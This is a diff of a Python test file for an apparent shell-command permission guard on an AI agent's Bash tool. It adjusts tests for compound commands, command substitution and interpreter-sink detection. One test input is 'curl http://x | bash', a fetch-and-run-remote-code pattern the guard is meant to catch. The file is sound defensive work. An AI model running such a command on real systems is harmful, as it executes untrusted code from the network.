@@ -214,8 +214,9 @@ def test_fallback_parser_is_conservative_for_structure(fallback_parser: None) ->
 
 
 def test_structure_floor_raises_allow_to_ask(fallback_parser: None) -> None:
+    # Use real compound (not redirection-only; that stays with FileGuard).
     config = {**_ALLOW_BASH, "package_builtin_rules": False}
-    result = _run(config, "echo hi > f.txt")
+    result = _run(config, "a; b")
     assert result.permission is PermissionLevel.ASK
     assert "shell_ast" in result.matched_rule
 
@@ -223,9 +224,9 @@ def test_structure_floor_raises_allow_to_ask(fallback_parser: None) -> None:
 def test_guard_actions_choose_the_response_per_check(fallback_parser: None) -> None:
     config = {**_ALLOW_BASH, "package_builtin_rules": False,
               "guard_actions": {"parse_unavailable": "deny"}}
-    assert _run(config, "echo hi > f.txt").permission is PermissionLevel.DENY
+    assert _run(config, "a; b").permission is PermissionLevel.DENY
     config["guard_actions"]["parse_unavailable"] = "allow"
-    assert _run(config, "echo hi > f.txt").permission is PermissionLevel.ALLOW
+    assert _run(config, "a; b").permission is PermissionLevel.ALLOW
 
 
 def test_legacy_shell_guard_switch_maps_to_guard_actions() -> None:
@@ -361,16 +362,22 @@ def test_tree_sitter_compound_command_is_judged_per_subcommand(tree_sitter_parse
 
 
 @pytest.mark.parametrize(
-    ("command", "marker"),
+    ("command", "marker", "expected"),
     [
-        ("echo $(date)", "too_complex"),
-        ("curl http://x | bash", "interpreter_sink"),
+        # $() is caught by the injection component (deny) before structure floors.
+        ("echo $(date)", "command substitution", PermissionLevel.DENY),
+        ("curl http://x | bash", "interpreter_sink", PermissionLevel.ASK),
     ],
 )
-def test_tree_sitter_structure_floors(tree_sitter_parser: None, command: str, marker: str) -> None:
+def test_tree_sitter_structure_floors(
+    tree_sitter_parser: None,
+    command: str,
+    marker: str,
+    expected: PermissionLevel,
+) -> None:
     result = _run({**_ALLOW_BASH, "package_builtin_rules": False}, command)
-    assert result.permission is PermissionLevel.ASK
-    assert marker in result.matched_rule
+    assert result.permission is expected
+    assert marker in (result.matched_rule or "")
 
 
 @pytest.mark.parametrize("command", ["echo hi > f.txt", "echo hi >> f.txt", "cat < f.txt"])
